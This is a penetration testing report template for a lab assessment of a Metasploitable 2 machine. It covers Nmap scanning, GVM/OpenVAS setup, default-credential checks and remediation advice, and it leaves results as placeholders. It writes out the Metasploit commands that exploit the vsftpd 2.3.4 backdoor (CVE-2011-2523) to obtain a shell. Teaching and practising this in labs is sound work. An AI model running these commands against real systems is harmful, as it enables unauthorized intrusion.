# Vulnerability Assessment and Penetration Testing (VA/PT) Report

---

## 1. Executive Summary

This report documents a vulnerability assessment and penetration testing exercise conducted in an authorized virtual lab environment. The assessment focused on identifying open ports, detecting vulnerable services, reviewing potential security weaknesses, and validating selected findings using penetration testing tools.

The target machine was `192.168.79.131`. Tools used included Nmap, Greenbone Vulnerability Management (GVM/OpenVAS), and Metasploit.

All testing was conducted within the assigned lab environment.

## 2. Scope

| Item | Details |
|---|---|
| Target IP | `192.168.79.131` |
| Attacker OS | Kali Linux |
| Target OS | Metasploitable 2 |
| Assessment type | VA/PT |
| Tools | Nmap, GVM/OpenVAS, Metasploit |

## 3. Methodology

The assessment followed these stages:

1. Verify connectivity with the target.
2. Perform host discovery.
3. Scan for open ports.
4. Identify services and versions.
5. Perform vulnerability scanning using GVM/OpenVAS.
6. Manually validate selected findings.
7. Conduct authorized exploitation in the isolated lab.
8. Document findings and remediation recommendations.

## 4. Host Discovery and Network Scanning

### 4.1 Kali Linux IP Address

The Kali Linux IP address was identified using:

```bash
ip -br addr
```

**[SCREENSHOT HOLDER 1 — Kali Linux IP address]**

*Insert screenshot showing the Kali Linux IP address.*

### 4.2 Target Connectivity

Connectivity was checked using:

```bash
ping -c 4 192.168.79.131
```

**[SCREENSHOT HOLDER 2 — Ping results]**

*Insert screenshot showing the ping command and its output.*

### 4.3 Host Discovery

The target was checked using Nmap:

```bash
nmap -sn 192.168.79.131
```

**[SCREENSHOT HOLDER 3 — Nmap host discovery]**

*Insert screenshot showing whether the target host was discovered.*

### 4.4 Port Scanning

A full TCP port scan was performed:

```bash
nmap -p- 192.168.79.131
```

**[SCREENSHOT HOLDER 4 — Full TCP port scan]**

*Insert screenshot showing the Nmap port scan results.*

### 4.5 Service and Version Detection

Service and version detection was performed:

```bash
nmap -sV 192.168.79.131
```

For additional OS detection:

```bash
sudo nmap -sV -O 192.168.79.131 -oN nmap_results.txt
```

**[SCREENSHOT HOLDER 5 — Service/version detection]**

*Insert screenshot showing discovered ports, services, and versions.*

## 5. Vulnerability Assessment Using GVM/OpenVAS

### 5.1 Installation and Setup

GVM/OpenVAS was installed and configured using:

```bash
sudo apt update
sudo apt install gvm -y
sudo gvm-setup
sudo gvm-check-setup
sudo gvm-start
```

The web interface was accessed at:

`https://127.0.0.1:9392`

**[SCREENSHOT HOLDER 6 — GVM setup or web interface]**

*Insert screenshot showing the GVM interface or successful setup.*

### 5.2 Target Configuration

A scan target was created using:

- **Target name:** Metasploitable 2
- **Target IP:** `192.168.79.131`

**[SCREENSHOT HOLDER 7 — GVM target configuration]**

*Insert screenshot showing the configured target IP.*

### 5.3 Vulnerability Scan

A vulnerability scan was launched against the target. The scan report was reviewed for detected vulnerabilities, severity levels, affected services, and remediation suggestions.

**[SCREENSHOT HOLDER 8 — GVM scan results]**

*Insert screenshot showing the completed scan and vulnerability results.*

### 5.4 Scan Findings

| Vulnerability | Severity | Evidence | Recommendation |
|---|---|---|---|
| [Finding from actual scan] | [Severity] | [Evidence] | [Recommendation] |
| [Finding from actual scan] | [Severity] | [Evidence] | [Recommendation] |
| [Finding from actual scan] | [Severity] | [Evidence] | [Recommendation] |

*Only enter findings that appear in your actual GVM report.*

## 6. Manual Vulnerability Validation

### 6.1 FTP Service Assessment

FTP was checked using:

```bash
nmap -sV -p21 192.168.79.131
```

If the service identifies itself as `vsftpd 2.3.4`, this version is associated with **CVE-2011-2523**, a known backdoor vulnerability.

**[SCREENSHOT HOLDER 9 — FTP service/version result]**

*Insert screenshot showing the actual FTP service and version detected.*

### 6.2 Metasploit Validation

Metasploit was used to validate the vulnerability in the isolated lab:

```bash
msfconsole -q
search vsftpd 2.3.4
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 192.168.79.131
show options
exploit
```

If a shell was obtained, the following commands were used to verify access:

```bash
id
whoami
```

**[SCREENSHOT HOLDER 10 — Metasploit module configuration]**

*Insert screenshot showing the selected module and configured target.*

**[SCREENSHOT HOLDER 11 — Exploitation result]**

*Insert screenshot showing the actual result of the exploit attempt.*

**[SCREENSHOT HOLDER 12 — Shell verification, if successful]**

*Insert screenshot showing the `id` and/or `whoami` output if a shell was obtained.*

### 6.3 Exploitation Outcome

**Actual result:** [Successful / Unsuccessful / Not tested]

**Evidence:** [Describe what appeared in the terminal.]

Do not report successful exploitation unless the lab output confirms it.

## 7. Credential and Login Testing

Default or weak credentials were checked only within the authorized lab environment.

Potential lab credentials listed in the assignment were tested where applicable. The outcome should be documented without publishing passwords in the report.

**[SCREENSHOT HOLDER 13 — Login validation]**

*Insert screenshot showing the login attempt and result. Hide or omit plaintext passwords.*

| Service | Login tested | Result |
|---|---|---|
| FTP | [Username] | [Successful / Unsuccessful] |
| SSH | [Username] | [Successful / Unsuccessful] |
| Other | [Username] | [Successful / Unsuccessful] |

## 8. Comparison: Manual Assessment vs. GVM/OpenVAS

| Feature | Manual Assessment | GVM/OpenVAS |
|---|---|---|
| Approach | Manual commands and validation | Automated vulnerability scanning |
| Service identification | Nmap | Scanner-based detection |
| Vulnerability detection | Requires analyst investigation | Uses vulnerability tests and feeds |
| Reporting | Manually documented | Generates scan reports |
| Validation | Can validate specific findings | Findings may require manual confirmation |

Manual testing and automated scanning complement each other. Scanner findings should be validated where possible to reduce false positives.

## 9. Findings and Recommendations

### Finding 1: Vulnerable FTP Service

**Evidence:** [Actual Nmap/GVM evidence]  
**Severity:** [Actual severity or risk rating]

**Recommendation:**
- Remove or upgrade vulnerable FTP software.
- Disable unnecessary FTP services.
- Prefer secure file transfer protocols.
- Restrict access using firewall rules.

### Finding 2: Weak or Default Credentials

**Evidence:** [Actual login testing result]  
**Severity:** [Actual severity]

**Recommendation:**
- Replace default credentials.
- Use strong, unique passwords.
- Disable unused accounts.
- Apply account lockout and authentication protections.

### Finding 3: Unnecessary Open Services

**Evidence:** [Actual Nmap results]  
**Severity:** [Actual severity]

**Recommendation:**
- Disable unnecessary services.
- Restrict access to required ports.
- Apply firewall rules.
- Keep installed software updated.

## 10. Conclusion

The VA/PT exercise demonstrated the process of discovering a target, identifying exposed services, scanning for vulnerabilities, and validating selected security findings in an authorized lab environment.

Nmap provided information about the target’s ports and services, while GVM/OpenVAS supported automated vulnerability assessment. Metasploit was used for controlled validation of selected findings.

The results highlight the importance of patch management, secure configuration, strong authentication, and reducing unnecessary service exposure.

## 11. References

- Nmap: https://nmap.org/
- Greenbone Vulnerability Management: https://greenbone.github.io/
- NVD CVE-2011-2523: https://nvd.nist.gov/vuln/detail/CVE-2011-2523
- Rapid7 Metasploit module: https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/

## 12. Evidence Appendix

Include any additional screenshots or scan exports here.

**[SCREENSHOT HOLDER 14 — Additional evidence]**

*Insert any supplementary evidence relevant to the assessment.*

**[SCREENSHOT HOLDER 15 — GVM report export or final evidence]**

*Insert the exported scan report or final evidence screenshot.*

